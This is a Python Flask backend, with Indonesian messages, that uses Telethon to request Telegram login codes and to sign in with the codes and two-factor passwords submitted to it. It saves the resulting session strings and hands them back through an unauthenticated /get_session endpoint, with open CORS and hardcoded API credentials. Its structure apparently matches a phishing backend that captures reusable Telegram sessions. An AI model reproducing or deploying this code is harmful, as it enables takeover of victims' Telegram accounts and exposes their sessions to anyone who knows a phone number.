from flask import Flask, request, jsonify
from telethon import TelegramClient
from telethon.sessions import StringSession
from flask_cors import CORS
from db import init_db, save_session, load_session, delete_session
import os
import asyncio
import nest_asyncio

nest_asyncio.apply()

API_ID = 28723467
API_HASH = "f51ed0208b47cfd04dc6409d64aa5bef"

SESSION_DIR = "session"
if not os.path.exists(SESSION_DIR):
    os.makedirs(SESSION_DIR)
    
loop = asyncio.get_event_loop()
loop.run_until_complete(init_db())
app = Flask(__name__)
CORS(app)


@app.route("/")
def home():
    return "✅ Telegram Login Backend Aktif"


@app.route("/send_code", methods=["POST"])
def send_code():
    data = request.json
    phone = data.get("phone", "").strip()

    if not phone or not phone.startswith("+"):
        return jsonify({"error": "Nomor telepon tidak valid"}), 400

    loop = asyncio.get_event_loop()

    async def send():
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        result = await client.send_code_request(phone)
        session_str = StringSession.save(client.session)
        await save_session(phone, session_str)
        await client.disconnect()
        return {"status": "code_sent"}

    try:
        result = loop.run_until_complete(send())
        return jsonify(result), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/verify_code", methods=["POST"])
def verify_code():
    data = request.json
    phone = data.get("phone")
    code = data.get("code")

    loop = asyncio.get_event_loop()

    async def verify():
        session_str = await load_session(phone)
        if not session_str:
            return {"error": "Session tidak ditemukan"}
        
        client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
        await client.connect()
        await client.sign_in(phone=phone, code=code)
        session_str = StringSession.save(client.session)
        await client.disconnect()
        return {"status": "logged_in", "session": session_str}

    try:
        result = loop.run_until_complete(verify())

        # Jika ada error session di dalam verify, balikin error
        if "error" in result:
            return jsonify(result), 400

        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/verify_password", methods=["POST"])
def verify_password():
    data = request.json
    phone = data.get("phone")
    password = data.get("password")

    loop = asyncio.get_event_loop()

    async def verify():
        session_str = await load_session(phone)
        if not session_str:
            return {"error": "Session tidak ditemukan"}

        client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
        await client.connect()
        await client.sign_in(password=password)
        session_str = StringSession.save(client.session)
        await client.disconnect()
        return {"status": "logged_in", "session": session_str}

    try:
        result = loop.run_until_complete(verify())

        if "error" in result:
            return jsonify(result), 400

        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500
@app.route("/get_session", methods=["POST"])
def get_session():
    data = request.json
    phone = data.get("phone")

    loop = asyncio.get_event_loop()

    async def get():
        session_str = await load_session(phone)
        if not session_str:
            return {"error": "Session tidak ditemukan"}
        return {"session": session_str}

    try:
        result = loop.run_until_complete(get())

        if "error" in result:
            return jsonify(result), 404

        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)
